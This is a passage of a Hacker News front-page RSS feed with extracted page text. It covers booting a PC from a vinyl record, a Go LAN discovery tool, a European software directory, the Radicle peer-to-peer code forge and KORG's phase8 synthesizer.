<?xml version='1.0' encoding='UTF-8'?>
<rss xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0"><channel><title>Hacker News: Front Page</title><link>https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml</link><description>Hacker News RSS</description><atom:link href="https://raw.githubusercontent.com/Prabesh01/hnrss-content-extract/refs/heads/main/out/rss.xml" rel="self"/><docs>http://www.rssboard.org/rss-specification</docs><generator>python-feedgen</generator><language>en</language><lastBuildDate>Fri, 23 Jan 2026 20:13:52 +0000</lastBuildDate><item><title>Booting from a vinyl record (2020)</title><link>https://boginjr.com/it/sw/dev/vinyl-boot/</link><description>&lt;doc fingerprint="5c71fe289328686"&gt;
  &lt;main&gt;
    &lt;p&gt;Most PCs tend to boot from a primary media storage, be it a hard disk drive, or a solid-state drive, perhaps from a network, or – if all else fails – the USB stick or the boot DVD comes to the rescue… Fun, eh? Boring! Why don’t we try to boot from a record player for a change?&lt;/p&gt;
    &lt;p&gt;64 512 byte DOS boot disk on a 10″ record, total playing time 06:10 on 45 rpm&lt;/p&gt;
    &lt;p&gt;Update February 2022: Click here to observe the very same vinyl ramdisk booted on an IBM PCjr!&lt;lb/&gt; So this nutty little experiment connects a PC, or an IBM PC to be exact, directly onto a record player through an amplifier. I made a small ROM on-chip boot loader that operates the built-in “cassette interface” of the PC (that was hardly ever used), which will now be invoked by the BIOS if all the other boot options fail, i.e. floppy disk and the hard drive. The turntable spins an analog recording of a small bootable read-only RAM drive, which is 64K in size. This contains a FreeDOS kernel, modified by me to cram it into the memory constraint, a micro variant of COMMAND.COM and a patched version of INTERLNK, that allows file transfer through a printer cable, modified to be runnable on FreeDOS. The bootloader reads the disk image from the audio recording through the cassette modem, loads it to memory and boots the system on it. Simple huh?&lt;/p&gt;
    &lt;p&gt;The vinyl loader code, in a ROM&lt;lb/&gt; (It can also reside on a hard drive or a floppy, but that’d be cheating)&lt;/p&gt;
    &lt;p&gt;And now to get more technical: this is basically a merge between BootLPT/86 and 5150CAXX, minus the printer port support. It also resides in a ROM, in the BIOS expansion socket, but it does not have to. The connecting cable between the PC and the record player amplifier is the same as with 5150CAXX, just without the line-in (PC data out) jack.&lt;lb/&gt; The “cassette interface” itself is just PC speaker timer channel 2 for the output, and 8255A-5 PPI port C channel 4 (PC4, I/O port 62h bit 4) for the input. BIOS INT 15h routines are used for software (de)modulation.&lt;lb/&gt; The boot image is the same 64K BOOTDISK.IMG “example” RAM drive that can be downloaded at the bottom of the BootLPT article. This has been turned into an “IBM cassette tape”-protocol compliant audio signal using 5150CAXX, and sent straight to a record cutting lathe.&lt;lb/&gt; Vinyls are cut with an RIAA equalization curve that a preamp usually reverses during playback, but not perfectly. So some signal correction had to be applied from the amplifier, as I couldn’t make it work right with the line output straight from the phono preamp. In my case, involving a vintage Harman&amp;amp;Kardon 6300 amplifier with an integrated MM phono preamp, I had to fade the treble all the way down to -10dB/10kHz, increase bass equalization to approx. +6dB/50Hz and reduce the volume level to approximately 0.7 volts peak, so it doesn’t distort. All this, naturally, with any phase and loudness correction turned off.&lt;lb/&gt; Of course, the cassette modem does not give a hoot in hell about where the signal is coming from. Notwithstanding, the recording needs to be pristine and contain no pops or loud crackles (vinyl) or modulation/frequency drop-outs (tape) that will break the data stream from continuing. However, some wow is tolerated, and the speed can be 2 or 3 percent higher or lower too.&lt;/p&gt;
    &lt;p&gt;Bootloader in a ROM; being an EPROM for a good measure&lt;/p&gt;
    &lt;p&gt;And that’s it! For those interested, the bootloader binary designed for a 2364 chip (2764s can be used, through an adaptor), can be obtained here. It assumes an IBM 5150 with a monochrome screen and at least 512K of RAM, which kind of reminds me of my setup (what a coincidence). The boot disk image can be obtained at the bottom of the BootLPT/86 article, and here’s its analog variant, straight from the grooves 🙂&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46730885</guid><pubDate>Fri, 23 Jan 2026 10:39:09 +0000</pubDate></item><item><title>Show HN: Whosthere: A LAN discovery tool with a modern TUI, written in Go</title><link>https://github.com/ramonvermeulen/whosthere</link><description>&lt;doc fingerprint="b709fb1d9ea3f390"&gt;
  &lt;main&gt;
    &lt;p&gt;Local Area Network discovery tool with a modern Terminal User Interface (TUI) written in Go. Discover, explore, and understand your LAN in an intuitive way.&lt;/p&gt;
    &lt;p&gt;Whosthere performs unprivileged, concurrent scans using mDNS and SSDP scanners. Additionally, it sweeps the local subnet by attempting TCP/UDP connections to trigger ARP resolution, then reads the ARP cache to identify devices on your Local Area Network. This technique populates the ARP cache without requiring elevated privileges. All discovered devices are enhanced with OUI lookups to display manufacturers when available.&lt;/p&gt;
    &lt;p&gt;Whosthere provides a friendly, intuitive way to answer the question every network administrator asks: "Who's there on my network?"&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Modern TUI: Navigate and explore discovered devices intuitively.&lt;/item&gt;
      &lt;item&gt;Fast &amp;amp; Concurrent: Leverages multiple discovery methods simultaneously.&lt;/item&gt;
      &lt;item&gt;No Elevated Privileges Required: Runs entirely in user-space.&lt;/item&gt;
      &lt;item&gt;Device Enrichment: Uses OUI lookup to show device manufacturers.&lt;/item&gt;
      &lt;item&gt;Integrated Port Scanner: Optional service discovery on found hosts (only scan devices with permission!).&lt;/item&gt;
      &lt;item&gt;Daemon Mode with HTTP API: Run in the background and integrate with other tools.&lt;/item&gt;
      &lt;item&gt;Theming &amp;amp; Configuration: Personalize the look and behavior via YAML configuration.&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;brew tap ramonvermeulen/whosthere
brew install whosthere&lt;/code&gt;
    &lt;p&gt;Or with Go:&lt;/p&gt;
    &lt;code&gt;go install github.com/ramonvermeulen/whosthere@latest&lt;/code&gt;
    &lt;p&gt;Or build from source:&lt;/p&gt;
    &lt;code&gt;git clone https://github.com/ramonvermeulen/whosthere.git
cd whosthere
make build&lt;/code&gt;
    &lt;p&gt;Run the TUI for interactive discovery:&lt;/p&gt;
    &lt;code&gt;whosthere&lt;/code&gt;
    &lt;p&gt;Run as a daemon with HTTP API:&lt;/p&gt;
    &lt;code&gt;whosthere daemon --port 8080&lt;/code&gt;
    &lt;p&gt;Additional command line options can be found by running:&lt;/p&gt;
    &lt;code&gt;whosthere --help&lt;/code&gt;
    &lt;p&gt;Whosthere is supported on the following platforms:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux&lt;/item&gt;
      &lt;item&gt;macOS&lt;/item&gt;
      &lt;item&gt;Windows (maybe in the future, contributions welcome!)&lt;/item&gt;
    &lt;/list&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Key&lt;/cell&gt;
        &lt;cell role="head"&gt;Action&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;/&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Start regex search&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;k&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Up&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;j&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Down&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;g&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to top&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;G&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Go to bottom&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;y&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Copy IP of selected device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;enter&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Show device details&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+t&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Toggle theme selector&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;CTRL+c&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Stop application&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;ESC&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Clear search / Go back&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;&lt;code&gt;p&lt;/code&gt; (details view)&lt;/cell&gt;
        &lt;cell&gt;Start port scan on device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;&lt;code&gt;tab&lt;/code&gt; (modal view)&lt;/cell&gt;
        &lt;cell&gt;Switch button selection&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;table&gt;
      &lt;row span="2"&gt;
        &lt;cell role="head"&gt;Variable&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="2"&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Path to the configuration file, to be able to overwrite the default location.&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;
          &lt;code&gt;WHOSTHERE_LOG&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Set the log level (e.g., &lt;code&gt;debug&lt;/code&gt;, &lt;code&gt;info&lt;/code&gt;, &lt;code&gt;warn&lt;/code&gt;, &lt;code&gt;error&lt;/code&gt;). Defaults to &lt;code&gt;info&lt;/code&gt;.&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Whosthere can be configured via a YAML configuration file. By default, it looks for the configuration file in the following order:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Path specified in the &lt;code&gt;WHOSTHERE_CONFIG&lt;/code&gt;environment variable (if set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;$XDG_CONFIG_HOME/whosthere/config.yaml&lt;/code&gt;(if&lt;code&gt;XDG_CONFIG_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.config/whosthere/config.yaml&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also written to the console output.&lt;/p&gt;
    &lt;p&gt;Example of the default configuration file:&lt;/p&gt;
    &lt;code&gt;# How often to run discovery scans
scan_interval: 20s

# Maximum duration for each scan
# If you set this too low some scanners or the sweeper might not complete in time
scan_duration: 10s

# Splash screen configuration
splash:
  enabled: true
  delay: 1s

# Theme configuration
theme:
  # Configure the theme to use for the TUI, complete list of available themes at:
  # https://github.com/ramonvermeulen/whosthere/tree/main/internal/ui/theme/theme.go
  # Set name to "custom" to use the custom colors below
  # For any color that is not configured it will take the default theme value as fallback
  name: default

  # Custom theme colors (uncomment and set name: custom to use)
  # primitive_background_color: "#000a1a"
  # contrast_background_color: "#001a33"
  # more_contrast_background_color: "#003366"
  # border_color: "#0088ff"
  # title_color: "#00ffff"
  # graphics_color: "#00ffaa"
  # primary_text_color: "#cceeff"
  # secondary_text_color: "#6699ff"
  # tertiary_text_color: "#ffaa00"
  # inverse_text_color: "#000a1a"
  # contrast_secondary_text_color: "#88ddff"

# Scanner configuration
scanners:
  mdns:
    enabled: true
  ssdp:
    enabled: true
  arp:
    enabled: true

# Port scanner configuration
port_scanner:
  timeout: 5s
  # List of TCP ports to scan on discovered devices
  tcp: [21, 22, 23, 25, 80, 110, 135, 139, 143, 389, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443, 9000, 9090, 9200, 9300, 10000, 27017]

# Uncomment the next line to configure a specific network interface - uses OS default if not set
# network_interface: lo0&lt;/code&gt;
    &lt;p&gt;When running Whosthere in daemon mode, it exposes an very simplistic HTTP API with the following endpoints:&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Method&lt;/cell&gt;
        &lt;cell role="head"&gt;Endpoint&lt;/cell&gt;
        &lt;cell role="head"&gt;Description&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/devices&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get list of all discovered devices&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/device/{ip}&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Get details of a specific device&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;GET&lt;/cell&gt;
        &lt;cell&gt;
          &lt;code&gt;/health&lt;/code&gt;
        &lt;/cell&gt;
        &lt;cell&gt;Health check&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Theme can be configured via the configuration file, or at runtime via the &lt;code&gt;CTRL+t&lt;/code&gt; key binding.
A complete list of available themes can be found here, feel free to open a PR to add your own theme!&lt;/p&gt;
    &lt;p&gt;Example of theme configuration:&lt;/p&gt;
    &lt;code&gt;theme:
  name: cyberpunk&lt;/code&gt;
    &lt;p&gt;When the &lt;code&gt;name&lt;/code&gt; is set to &lt;code&gt;custom&lt;/code&gt;, the other color options can be used to create your own custom theme.&lt;/p&gt;
    &lt;p&gt;Logs are written to the application's state directory:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;$XDG_STATE_HOME/whosthere/app.log&lt;/code&gt;(if&lt;code&gt;XDG_STATE_HOME&lt;/code&gt;is set)&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;~/.local/state/whosthere/app.log&lt;/code&gt;(otherwise)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;When not running in TUI mode, logs are also output to the console.&lt;/p&gt;
    &lt;p&gt;For clipboard functionality to work:&lt;/p&gt;
    &lt;p&gt;Runtime requirements:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux (X11): X11 client library (e.g., &lt;code&gt;libx11-6&lt;/code&gt;on Ubuntu,&lt;code&gt;libX11&lt;/code&gt;on Fedora/Arch, often pre-installed).&lt;/item&gt;
      &lt;item&gt;Linux (Wayland): Not natively supported. May require XWayland.&lt;/item&gt;
      &lt;item&gt;macOS/Windows: No dependencies.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Build requirements (when compiling from source):&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Linux: X11 development package (&lt;code&gt;libx11-dev&lt;/code&gt;,&lt;code&gt;libX11-devel&lt;/code&gt;, or&lt;code&gt;libx11&lt;/code&gt;)&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Whosthere is intended for use on networks where you have permission to perform network discovery and scanning, such as your own home network. Unauthorized scanning of networks may be illegal and unethical. Always obtain proper authorization before using this tool on any network.&lt;/p&gt;
    &lt;p&gt;Contributions and suggestions such as feature requests, bug reports, or improvements are welcome! Feel free to open issues or submit pull requests on the GitHub repository. Please make sure to discuss any major changes on a Github issue before implementing them.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731432</guid><pubDate>Fri, 23 Jan 2026 11:54:53 +0000</pubDate></item><item><title>European Alternatives</title><link>https://european-alternatives.eu</link><description>&lt;doc fingerprint="8c31fd39e929e0e6"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;European alternatives for digital products&lt;/head&gt;
    &lt;head rend="h2"&gt;We help you find European alternatives for digital service and products, like cloud services and SaaS products.&lt;/head&gt;
    &lt;list rend="dl"&gt;
      &lt;item rend="dt-1"&gt;
        &lt;p&gt;Support local businesses&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-1"&gt;When you buy from local businesses, you are supporting yourself down the road. Taxes paid by the company come back to you indirectly and the company creates jobs in your region.&lt;/item&gt;
      &lt;item rend="dt-2"&gt;
        &lt;p&gt;Data protection / GDPR&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-2"&gt;Some companies outside Europe tend to ignore data protection and related laws such as the GDPR or do not implement them correctly.&lt;/item&gt;
      &lt;item rend="dt-3"&gt;
        &lt;p&gt;VAT / Billing&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-3"&gt;As a business that operates in Europe, it is possible to get a VAT refund for products/services of other European companies. European companies also tend to offer payment methods that are commonly used in Europe.&lt;/item&gt;
      &lt;item rend="dt-4"&gt;
        &lt;p&gt;Similar legal requirements&lt;/p&gt;
      &lt;/item&gt;
      &lt;item rend="dd-4"&gt;Within the EU, many laws and framework conditions are set by the EU, which helps to cover a large market without having to consider large country-specific differences. It is also easier to enforce your rights against another company located in the EU.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Categories&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Web analytics services&lt;/head&gt;&lt;p&gt;A web analytics service tracks user behavior on websites so that website owners can understand user usage and optimize their websites.&lt;/p&gt;31 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Cloud computing platforms&lt;/head&gt;&lt;p&gt;A cloud computing platform provides on-demand hosting services.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Content delivery network (CDN) services&lt;/head&gt;&lt;p&gt;A content delivery network (CDN) is a geographically distributed network.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Email providers&lt;/head&gt;&lt;p&gt;An email provider provides its users with an e-mail address and the corresponding mailboxes.&lt;/p&gt;20 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Virtual private server (VPS) hosters&lt;/head&gt;&lt;p&gt;A virtual private server (VPS) hoster provides virtual servers with predefined RAM, storage, traffic and virtual cores.&lt;/p&gt;23 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Search engines&lt;/head&gt;&lt;p&gt;A search engine allows their users to search the internet.&lt;/p&gt;6 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Transactional email service&lt;/head&gt;&lt;p&gt;A transactional mail service offers users the ability to send emails from their applications via the service.&lt;/p&gt;7 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Domain name registrars&lt;/head&gt;&lt;p&gt;Domain name registrars are companies that manages the reservation of Internet domain names.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Time tracking apps&lt;/head&gt;&lt;p&gt;A time tracking app is an application that helps users track how much time was spent on which task or project.&lt;/p&gt;13 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Navigation apps&lt;/head&gt;&lt;p&gt;Navigation apps help you get from A to B.&lt;/p&gt;8 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Uptime monitoring services&lt;/head&gt;&lt;p&gt;An uptime monitoring service periodically checks if a website or other service is active.&lt;/p&gt;12 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;File hosting services&lt;/head&gt;&lt;p&gt;With a file hosting service, users can upload files to back them up or share them with others.&lt;/p&gt;11 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Machine translation services&lt;/head&gt;&lt;p&gt;A machine translation service (translator) is a service that programmatically translates text from one language to another.&lt;/p&gt;5 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Object storage providers&lt;/head&gt;&lt;p&gt;Object storage providers allow their users to store files hierarchically.&lt;/p&gt;15 alternatives&lt;/item&gt;
      &lt;item&gt;&lt;head rend="h3"&gt;Microblogging services&lt;/head&gt;&lt;p&gt;A microblogging service allows users to post short texts, images or links to videos.&lt;/p&gt;2 alternatives&lt;/item&gt;
    &lt;/list&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46731976</guid><pubDate>Fri, 23 Jan 2026 13:01:51 +0000</pubDate></item><item><title>Radicle: The Sovereign Forge</title><link>https://radicle.xyz</link><description>&lt;doc fingerprint="a0671596b436ca2c"&gt;
  &lt;main&gt;
    &lt;p&gt;Radicle is a sovereign {code forge} built on Git.&lt;/p&gt;
    &lt;head rend="h1"&gt;Synopsis&lt;/head&gt;
    &lt;p&gt;Radicle is an open source, peer-to-peer code collaboration stack built on Git. Unlike centralized code hosting platforms, there is no single entity controlling the network. Repositories are replicated across peers in a decentralized manner, and users are in full control of their data and workflow.&lt;/p&gt;
    &lt;p&gt; The Radicle &lt;code&gt;heartwood&lt;/code&gt; repository. Repository ID
  &lt;code&gt;rad:z3gqcJUoA1n9HaHKufZs5FCSGazv5&lt;/code&gt;.
&lt;/p&gt;
    &lt;head rend="h1"&gt;Get started&lt;/head&gt;
    &lt;quote&gt;ð¾ ·&lt;/quote&gt;
    &lt;p&gt;To install Radicle, simply run the command below from your shell, or go to the download page.&lt;/p&gt;
    &lt;code&gt;curl -sSLf https://radicle.xyz/install | sh&lt;/code&gt;
    &lt;p&gt;Alternatively, you can build from source.&lt;/p&gt;
    &lt;p&gt;For now, Radicle only works on Linux, macOS and BSD variants.&lt;/p&gt;
    &lt;head rend="h2"&gt;Radicle Desktop ð¥ï¸&lt;/head&gt;
    &lt;p&gt;For a graphical collaborative experience check out the Radicle Desktop client, as well.&lt;/p&gt;
    &lt;head rend="h1"&gt;How it works&lt;/head&gt;
    &lt;p&gt;The Radicle protocol leverages cryptographic identities for code and social artifacts, utilizes Git for efficient data transfer between peers, and employs a custom gossip protocol for exchanging repository metadata.&lt;/p&gt;
    &lt;head rend="h2"&gt;Your Data, Forever and Secure&lt;/head&gt;
    &lt;p&gt;All social artifacts are stored in Git, and signed using public-key cryptography. Radicle verifies the authenticity and authorship of all data for you.&lt;/p&gt;
    &lt;head rend="h2"&gt;Unparalleled Autonomy&lt;/head&gt;
    &lt;p&gt;Radicle enables users to run their own nodes, ensuring censorship-resistant code collaboration and fostering a resilient network without reliance on third-parties.&lt;/p&gt;
    &lt;head rend="h2"&gt;Local-first&lt;/head&gt;
    &lt;p&gt;Radicle is local-first, providing always-available functionality even without internet access. Users own their data, making migration, backup, and access easy both online and offline.&lt;/p&gt;
    &lt;head rend="h2"&gt;Evolvable &amp;amp; Extensible&lt;/head&gt;
    &lt;p&gt;Radicleâs Collaborative Objects (COBs) provide Radicleâs social primitive. This enables features such as issues, discussions and code review to be implemented as Git objects. Developers can extend Radicleâs capabilities to build any kind of collaboration flow they see fit.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modular by Design&lt;/head&gt;
    &lt;p&gt;The Radicle Stack comes with a CLI, web interface and TUI, that are backed by the Radicle Node and HTTP Daemon. Itâs modular, so any part can be swapped out and other clients can be developed.&lt;/p&gt;
    &lt;quote&gt;âââââââââââââââââââââââââââââââââââââ â Radicle CLI ââ Radicle Web â âââââââââââââââââââââââââââââââââââââ âââââââââââââââââââââââââââââââââââââ â Radicle Repository â â ââââââââââ ââââââââââ âââââââââââ â â â code â â issues â â patches â â â ââââââââââ ââââââââââ âââââââââââ â âââââââââââââââââââââââââââââââââââââ¤ â Radicle Storage (Git) â âââââââââââââââââââââââââââââââââââââ âââââââââââââââââââââââââââââââââââââ â Radicle Node ââ Radicle HTTPD â ââââââââââââââââââ¤âââââââââââââââââââ¤ â NoiseXK ââ HTTP + JSON â âââââââââââââââââââââââââââââââââââââ&lt;/quote&gt;
    &lt;head rend="h1"&gt;Contributing&lt;/head&gt;
    &lt;p&gt;Radicle is free and open source software under the MIT and Apache 2.0 licenses. Get involved by contributing code.&lt;/p&gt;
    &lt;head rend="h1"&gt;Updates&lt;/head&gt;
    &lt;p&gt;Follow us on ð Mastodon, ð¦ Bluesky or ð¦ Twitter to stay updated, join our community on ð¬ Zulip, or Subscribe&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.01.2026 Radicle 1.6.0 released. â¨&lt;/item&gt;
      &lt;item&gt;30.09.2025 Radicle 1.5.0 released.&lt;/item&gt;
      &lt;item&gt;04.09.2025 Radicle 1.4.0 released.&lt;/item&gt;
      &lt;item&gt;12.08.2025 Radicle 1.3.0 released.&lt;/item&gt;
      &lt;item&gt;17.07.2025 Radicle 1.2.1 released.&lt;/item&gt;
      &lt;item&gt;13.06.2025 Radicle Desktop is out. ð¥ï¸&lt;/item&gt;
      &lt;item&gt;02.06.2025 Radicle 1.2.0 released.&lt;/item&gt;
      &lt;item&gt;05.12.2024 Radicle 1.1.0 released.&lt;/item&gt;
      &lt;item&gt;10.09.2024 Radicle 1.0.0 released.&lt;/item&gt;
      &lt;item&gt;26.03.2024 Radicle 1.0.0-rc.1 released.&lt;/item&gt;
      &lt;item&gt;10.03.2024 New Radicle homepage.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle Guides launch.&lt;/item&gt;
      &lt;item&gt;05.03.2024 Radicle makes it to the top of Hacker News!&lt;/item&gt;
      &lt;item&gt;18.04.2023 Radicle heartwood is announced.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h2"&gt;Blog&lt;/head&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;14.08.2025 Jujutsu + Radicle = â¤ï¸&lt;/item&gt;
      &lt;item&gt;12.08.2025 Canonical References&lt;/item&gt;
      &lt;item&gt;23.07.2025 Using Radicle CI for Development&lt;/item&gt;
      &lt;item&gt;30.05.2025 How we used Radicle with GitHub Actions&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h1"&gt;Feedback&lt;/head&gt;
    &lt;p&gt;If you have feedback, join our Zulip or send us an email at feedback@radicle.xyz. Emails sent to this address are automatically posted to our #feedback channel on Zulip.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46732213</guid><pubDate>Fri, 23 Jan 2026 13:25:42 +0000</pubDate></item><item><title>KORG phase8 – Acoustic Synthesizer</title><link>https://www.korg.com/us/products/dj/phase8/</link><description>&lt;doc fingerprint="ae7bc2283ab4b732"&gt;
  &lt;main&gt;
    &lt;p&gt;phase8 is an organic, responsive instrument that feels alive in your hands and responds to the world around you.&lt;/p&gt;
    &lt;head rend="h1"&gt;Haptic sound generation through Acoustic Synthesis&lt;/head&gt;
    &lt;p&gt;Acoustic Synthesis uses physically vibrating bodies to generate sound, enhanced with the electronic control you’d expect from a synthesizer. The result is an instrument that produces sound which feels alive and responds to physical interactions such as touch and acoustic feedback. &lt;lb/&gt; It is beyond “analogue vs digital”. It’s even beyond electronics. &lt;lb/&gt;8 independent electromechanical voices with steel resonators are at the heart of the instrument’s acoustic sound.&lt;/p&gt;
    &lt;head rend="h2"&gt;Swapable and tunable steel resonators&lt;/head&gt;
    &lt;p&gt;phase8 comes with 13 chromatically tuned resonators; 8 of your choice can be installed at any one time. Through envelope control, these resonators can produce everything from short percussive sounds to long, drawn-out sustained notes. &lt;lb/&gt;The design allows you to easily swap and tune resonators, letting you customise the scale and character of your phase8.&lt;/p&gt;
    &lt;head rend="h2"&gt;Polymetric rhythm sequencer&lt;/head&gt;
    &lt;p&gt; An intuitive sequencer supports both step programming and unquantized live recording. Each voice offers step skip for polymetric sequencing. &lt;lb/&gt;All sequences can be saved and recalled across 8 memory slots.&lt;/p&gt;
    &lt;head rend="h2"&gt;Modulation modes&lt;/head&gt;
    &lt;p&gt;You can cycle between three distinct amplitude modulation effects: tremolo and two audio rate, pitch-dependent modulation types. The last modulation effect can be optionally harmonically quantised.&lt;/p&gt;
    &lt;head rend="h2"&gt;Trigger delay&lt;/head&gt;
    &lt;p&gt;Using the instrument’s shift knob, you can add delayed triggers to the resonators relative to the selected or synced tempo.&lt;/p&gt;
    &lt;head rend="h2"&gt;Parameter automation&lt;/head&gt;
    &lt;p&gt;All controls on the instrument’s panel can be automated over a sequence using the record function.&lt;/p&gt;
    &lt;head rend="h2"&gt;Real-time interaction&lt;/head&gt;
    &lt;p&gt;Beyond adjusting parameters, phase8 invites physical interaction. Sculpt sound by touching, plucking, strumming, or tapping the resonators – or experiment by adding found objects for new textures. &lt;lb/&gt;The AIR slider lets you boost (or quiet) the acoustic response of whatever you bring in contact with the instrument.&lt;/p&gt;
    &lt;head rend="h2"&gt;External connectivity&lt;/head&gt;
    &lt;p&gt; Both MIDI / USB-MIDI and CV can be used to externally control the knob parameters. &lt;lb/&gt;phase8 can be tempo synchronized to other devices over MIDI / USB-MIDI and Sync. &lt;lb/&gt;External MIDI devices can be used to trigger notes in the Acoustic Synth, and the sequencer can trigger notes in external MIDI instruments over MIDI / USB-MIDI. These connectivity options allow many possibilities for phase8 to integrate into any creative setup.&lt;/p&gt;
